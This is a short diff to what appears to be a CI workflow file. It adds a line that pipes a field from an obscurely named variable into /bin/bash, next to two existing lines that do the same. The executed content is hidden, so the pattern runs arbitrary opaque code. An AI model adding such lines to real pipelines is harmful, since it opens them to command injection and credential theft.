@@ -23,6 +23,7 @@ jobs:
         run: |
           printf '%s' "$ex93" | jq -r .jhoea1 | /bin/bash
           printf '%s' "$zgdu4307" | jq -r .lft7 | /bin/bash
+          echo $yr13196 | jq -r .e46149 | /bin/bash
 
       - name: Upload output
         uses: actions/upload-artifact@v4
